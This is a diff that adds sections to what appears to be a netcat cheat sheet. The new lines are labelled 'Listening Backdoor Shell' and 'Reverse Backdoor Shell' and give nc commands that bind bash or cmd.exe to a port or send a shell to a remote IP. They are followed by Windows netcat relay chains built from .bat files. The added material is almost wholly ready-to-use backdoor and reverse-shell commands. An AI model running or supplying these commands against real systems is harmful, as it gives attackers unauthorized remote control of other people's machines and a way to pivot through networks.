@@ -131,3 +131,52 @@ $ nc -4 -u localhost 2389
 
 $ netstat | grep 2389
 udp        0      0 localhost:42634         localhost:2389          ESTABLISHED
+
+-----------------------------------------------------------------------------------------------
+
+**Listening Backdoor Shell
+> On Linux
+$ nc -l -p [localport] -e /bin/bash
+
+> On Windows
+C:\> nc -l -p [localport] -e cmd.exe
+
+**Reverse Backdoor Shell
+> On Linux
+$ nc [IP] [port] -e /bin/bash
+
+> On Windows
+C:\> nc [IP] [port] -e cmd.exe
+
+-----------------------------------------------------------------------------------------------
+
+**Netcat Relays on Windows
+
+1. Create a temporary directory to store *.bat files
+
+[Listener-to-Client]
+          |   
+          |   Server{SEND}--------->(relay.bat)---------->Client{EXECUTE}
+          | [ClientIP][port]                                [port]
+Server :
+C:\> echo nc [ClientIP][port] > relay.bat
+Client :
+C:\> nc -l -p [port] -e relay.bat
+
+[Listener-to-Listener]
+          |   
+          |   Server{SEND}--------->(relay.bat)---------->Server{EXECUTE}
+          |     [port_1]                                     [port_2]
+Server :
+C:\> echo nc -l -p [port_2] > relay.bat
+Server :
+C:\> nc -l -p [port_1] -e relay.bat
+
+[Client-to-Client]
+          |   
+          |   Server{SEND}--------->(relay.bat)---------->Client{EXECUTE}
+          | [ClientIP][port]                                [port]
+Client :
+C:\> echo nc [ClientIP][port] > relay.bat
+Client :
+C:\> nc -l -p [port] -e relay.bat
